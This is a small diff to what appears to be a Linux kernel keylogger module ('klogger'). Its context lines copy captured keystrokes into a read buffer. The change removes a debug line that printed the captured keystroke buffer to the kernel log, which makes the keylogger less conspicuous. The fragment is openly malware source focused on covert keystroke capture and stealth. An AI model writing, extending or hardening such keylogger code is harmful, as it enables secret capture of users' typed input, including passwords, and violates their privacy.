@@ -43,6 +43,5 @@
     }
     strncpy(klogger->keyboard_read_buffer+klogger->keyboard_read_buffer_offset,tmp,keystrlen);//scriem
     klogger->keyboard_read_buffer_offset+=keystrlen;
-    pr_info("klogger_read_buffer %s\n",klogger->keyboard_read_buffer);
     return NOTIFY_OK;
 }
